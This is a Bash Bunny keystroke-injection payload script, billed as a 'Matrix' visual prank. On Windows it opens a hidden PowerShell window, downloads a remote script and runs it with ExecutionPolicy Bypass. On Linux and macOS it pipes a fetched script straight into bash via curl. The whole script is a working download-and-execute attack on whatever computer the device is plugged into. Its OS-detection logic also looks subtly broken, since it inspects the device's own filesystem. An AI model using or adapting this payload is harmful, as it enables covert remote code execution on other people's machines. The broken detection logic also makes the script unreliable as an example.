#!/bin/bash
#
# Title: Matrix Visualization Payload
# Author: most
# Version: 1.0
# Target: Windows/Linux/macOS
# Description: Deploys a Matrix-style visual effect on the target computer
# using keyboard simulation to run a Python script
#
# Function to detect the target OS
detect_os() {
    # Check for Windows by looking for common Windows directories
    if [ -d "/mnt/c/Windows" ] || [ -d "/windows" ]; then
        echo "WINDOWS"
        return
    fi
    
    # Check for macOS by looking for common macOS directories
    if [ -d "/System/Library/CoreServices" ] || [ -f "/mach_kernel" ]; then
        echo "MACOS"
        return
    fi
    
    # Check for Linux (default case)
    if [ -f "/proc/version" ] || [ -d "/etc" ]; then
        echo "LINUX"
        return
    fi
    
    # If we can't determine the OS, default to UNKNOWN
    echo "UNKNOWN"
}

# Set the LED to show payload is running (ATTACK MODE)
LED SETUP
# Wait for the Bash Bunny to be recognized as a USB device
sleep 3
# Detect the target OS
TARGET_OS=$(detect_os)
case $TARGET_OS in
WINDOWS)
    # Windows specific commands
    LED ATTACK
    QUACK GUI r
    sleep 1
    QUACK STRING powershell -WindowStyle Hidden -Command "iwr -Uri 'https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/general/MatrixPayload/get.ps1' -OutFile \$env:TEMP\\matrix.ps1; powershell -ExecutionPolicy Bypass -File \$env:TEMP\\matrix.ps1"
    QUACK ENTER
    ;;
LINUX)
    # Linux specific commands
    LED ATTACK
    QUACK ALT F2
    sleep 1
    QUACK STRING "gnome-terminal -- bash -c 'curl -s https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/general/MatrixPayload/matrix.sh | bash; exec bash'"
    QUACK ENTER
    ;;
MACOS)
    # macOS specific commands
    LED ATTACK
    QUACK GUI SPACE
    sleep 1
    QUACK STRING "terminal"
    QUACK ENTER
    sleep 2
    QUACK STRING "curl -s https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/general/MatrixPayload/matrix.sh | bash"
    QUACK ENTER
    ;;
*)
    # Default case if OS detection fails
    LED FAIL
    exit 1
    ;;
esac
# Payload completed
LED FINISH